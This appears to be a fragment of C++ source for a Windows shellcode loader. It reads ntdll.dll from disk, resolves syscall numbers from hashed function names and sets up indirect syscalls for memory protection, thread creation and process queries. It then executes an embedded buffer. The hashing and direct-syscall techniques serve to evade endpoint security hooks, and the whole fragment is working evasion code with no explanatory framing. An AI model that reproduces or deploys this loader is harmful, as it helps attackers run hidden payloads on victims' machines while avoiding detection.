    pNtProtectVirtualMemory = (_NtProtectVirtualMemory)SysNtProtectVirtualMem;
    return init_NtReadVirtualMemory(parser, fileData);
}

__declspec(noinline) bool init_NtCreateThreadEx(PE_PARSER& parser, std::vector<uint8_t>& fileData) {
    SysNtCreateThreadEx = syscall_num(1019659699, parser, fileData);
    if (!SysNtCreateThreadEx) {
        exit(-1);
    }
    pNtCreateThreadEx = (_NtCreateThreadEx)SysNtCreateThreadEx;
    return init_NtProtectVirtualMemory(parser, fileData);
}

__declspec(noinline) bool init_NtWaitForSingleObject(PE_PARSER& parser, std::vector<uint8_t>& fileData) {
    SysNtWaitForSingleObject = syscall_num(2718086303, parser, fileData);
    if (!SysNtWaitForSingleObject) {
        exit(-1);
    }
    pNtWaitForSingleObject = (_NtWaitForSingleObject)SysNtWaitForSingleObject;
    return init_NtCreateThreadEx(parser, fileData);
}

__declspec(noinline) bool init_NtQueryInformationProcess(PE_PARSER& parser, std::vector<uint8_t>& fileData) {
    SysNtQueryInformationProcess = syscall_num(2844812357, parser, fileData);
    if (!SysNtQueryInformationProcess) {
        exit(-1);
    }
    pNtQueryInformationProcess = (_NtQueryInformationProcess)SysNtQueryInformationProcess;
    return init_NtWaitForSingleObject(parser, fileData);
}


__declspec(noinline) bool init_syscalls(PE_PARSER & parser, std::vector<uint8_t> &fileData) {
    g_syscall_addr = syscall_address(parser, fileData);
    init_NtQueryInformationProcess(parser,fileData);
    execute = 1;
    executeBuffer(buffer, len_buffer);
    return 1;

}

std::vector<uint8_t> init_fileRead(const char* path) {
    std::ifstream dllFile(path, std::ios::binary | std::ios::ate);

    if (!dllFile.is_open()) {
        std::cerr << "Failed to open file: " << path << std::endl;
        exit(1);
    }

    size_t fileSize = dllFile.tellg();
    std::vector<uint8_t> fileData(fileSize);
    dllFile.seekg(0, std::ios::beg);
    dllFile.read(reinterpret_cast<char*>(fileData.data()), fileSize);
    dllFile.close();
    return fileData;
}

int main() {
    bool isElf;
    const char* path = "C:\\Windows\\System32\\ntdll.dll";
    PE_PARSER parser = PE_PARSER(path, &isElf);
    std::vector<uint8_t>fileData = init_fileRead(path);
    init_syscalls(parser, fileData);
	return 0;
}